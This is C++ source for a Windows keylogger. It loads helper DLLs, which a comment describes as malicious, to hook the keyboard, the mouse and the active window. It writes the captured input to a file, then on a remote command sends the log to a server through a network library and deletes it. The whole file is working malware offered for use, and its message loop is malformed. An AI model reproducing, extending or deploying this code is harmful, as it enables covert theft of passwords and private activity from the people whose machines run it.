//cl /EHsc .\keylogger.cpp /link ws2_32.lib user32.lib /OUT:keylogger.exe
/*

    uses the network_lib to send and receive data
    hooks the keyboard and mouse to log keystrokes and mouse clicks
    logs the keystrokes and mouse clicks to a file
    sends the log file to the server when requested

    !! will need the  network_lib.dll and others in the same directory as the executable   !!

    make the malicious dlls to load from memory
*/

#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <mutex>
#include <vector>

using namespace std;

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

LPCSTR dllPath_n = "network_lib.dll";
LPCSTR dllPath_k = "keylog_k_lib.dll";
LPCSTR dllPath_m = "keylog_m_lib.dll";
LPCSTR dllPath_w = "keylog_w_lib.dll";
HINSTANCE hDLL_n, hDLL_k, hDLL_m, hDLL_w;

//------------------------------------------------------------------------------------------------------------------------------

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef string (*RecvDataFunc)(const std::string&);
typedef vector<unsigned char> (*RecvDataRawFunc)(const std::string&);
SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

//==============================================================================================================================

typedef void(*CleanupFunc)(const std::string&);
typedef void(*InitializeFunc)(const std::string&);
InitializeFunc initialize_keyboard, initialize_mouse, initialize_active_window;
CleanupFunc cleanup_keyboard, cleanup_mouse, cleanup_active_window;

//------------------------------------------------------------------------------------------------------------------------------

bool running = true;
std::ofstream outputFile("keystrokes.txt", std::ios::app);

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int load_dlls();
BOOL CtrlHandler(DWORD fdwCtrlType);
std::string readFile(const std::string& filename);

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int main(int argc, char* argv[])
{
    std::atomic<bool> receivedTerminationSignal(false);
    
    if (load_dlls() != 0)return 1;
    //cout << "DLL loaded successfully.\n";

    // Set the console control handler
    if (!SetConsoleCtrlHandler(CtrlHandler, TRUE))
    {
        std::cerr << "Error setting console control handler" << std::endl;
        return 1;
    }


    initialize_active_window("keystrokes.txt");
    initialize_keyboard("keystrokes.txt");
    initialize_mouse("keystrokes.txt");


    std::thread terminationCheckThread([&]()
    {
        while (true)
        {
            string a = receive_data("klogger_cmd.txt");
            if (a[0] == 's')
            {
                receivedTerminationSignal = true;
                send_data("klogger_cmd.txt","`");

                string contents = readFile("keystrokes.txt");
                send_data("key_strokes.txt",contents);

                
                cleanup_keyboard("keystrokes.txt");
                cleanup_mouse("keystrokes.txt");
                cleanup_active_window("keystrokes.txt");
                outputFile.close();
                remove("keystrokes.txt");

                break; 
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100)); 
        }
    });
    
    // Main thread continues to process Windows messages
    MSG msg;
    while (!receivedTerminationSignal)
    {
        if (PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE)) std::this_thread::sleep_for(std::chrono::milliseconds(10));
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    terminationCheckThread.join();

    FreeLibrary(hDLL_n);
    FreeLibrary(hDLL_k);
    FreeLibrary(hDLL_m);
    FreeLibrary(hDLL_w);

    return 0;
}

std::string readFile(const std::string& filename)           // needed to read the keystrokes file soo can send it to the server
{
  std::ifstream file(filename);
  if (!file.is_open())
  {
    std::cerr << "Error: Could not open file '" << filename << "'" << std::endl;
    return ""; 
  }

  std::stringstream buffer;
  buffer << file.rdbuf(); 

  return buffer.str();
}

int load_dlls()                                             // loads the dlls from the disk
{
    hDLL_n = LoadLibraryA(dllPath_n);
    if (hDLL_n == nullptr)
    {
        std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    receive_data_raw = (RecvDataRawFunc)GetProcAddress(hDLL_n, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    receive_data = (RecvDataFunc)GetProcAddress(hDLL_n, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");
    send_data = (SendDataFunc)GetProcAddress(hDLL_n, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");
    if (!receive_data || !send_data || !receive_data_raw)
    {
        std::cerr << "Failed to get one or more function addresses for network dll.\n";
        FreeLibrary(hDLL_n);
        return 1;
    }

    //------------------------------------------------------------------------------------------------------------------------------

    hDLL_k = LoadLibraryA(dllPath_k);
    if (hDLL_k == nullptr)
    {
        std::cerr << "Failed to load keyboard DLL: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    initialize_keyboard = (InitializeFunc)GetProcAddress(hDLL_k, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
    cleanup_keyboard = (CleanupFunc)GetProcAddress(hDLL_k, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
    if (!initialize_keyboard || !cleanup_keyboard)
    {
        std::cerr << "Failed to get one or more function addresses for keyboard dll.\n";
        FreeLibrary(hDLL_k);
        return 1;
    }

    //------------------------------------------------------------------------------------------------------------------------------

    hDLL_m = LoadLibraryA(dllPath_m);
    if (hDLL_m == nullptr)
    {
        std::cerr << "Failed to load mouse DLL: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    initialize_mouse = (InitializeFunc)GetProcAddress(hDLL_m, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
    cleanup_mouse = (CleanupFunc)GetProcAddress(hDLL_m, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
    if (!initialize_mouse || !cleanup_mouse)
    {
        std::cerr << "Failed to get one or more function addresses for mouse dll.\n";
        FreeLibrary(hDLL_m);
        return 1;
    }

    //------------------------------------------------------------------------------------------------------------------------------

    hDLL_w = LoadLibraryA(dllPath_w);
    if (hDLL_w == nullptr)
    {
        std::cerr << "Failed to load active window DLL: " << GetLastError() << std::endl;
        return EXIT_FAILURE;
    }

    initialize_active_window = (InitializeFunc)GetProcAddress(hDLL_w, "?Initialize@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
    cleanup_active_window = (CleanupFunc)GetProcAddress(hDLL_w, "?Cleanup@@YAXAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z");
    if (!initialize_active_window || !cleanup_active_window)
    {
        std::cerr << "Failed to get one or more function addresses for active window dll.\n";
        FreeLibrary(hDLL_w);
        return 1;
    }

    //------------------------------------------------------------------------------------------------------------------------------

    return 0;
}

BOOL CtrlHandler(DWORD fdwCtrlType)
{
    switch (fdwCtrlType)
    {
        case CTRL_C_EVENT:
        case CTRL_BREAK_EVENT:
        case CTRL_CLOSE_EVENT:
        case CTRL_LOGOFF_EVENT:
        case CTRL_SHUTDOWN_EVENT:
            
            running = false;
            
            cleanup_keyboard("keystrokes.txt");
            cleanup_mouse("keystrokes.txt");
            cleanup_active_window("keystrokes.txt");
            outputFile.close();

            FreeLibrary(hDLL_n);
            FreeLibrary(hDLL_k);
            FreeLibrary(hDLL_m);
            FreeLibrary(hDLL_w);

            return TRUE; // Indicate that the signal was handled
        default:
            return FALSE;
    }
}

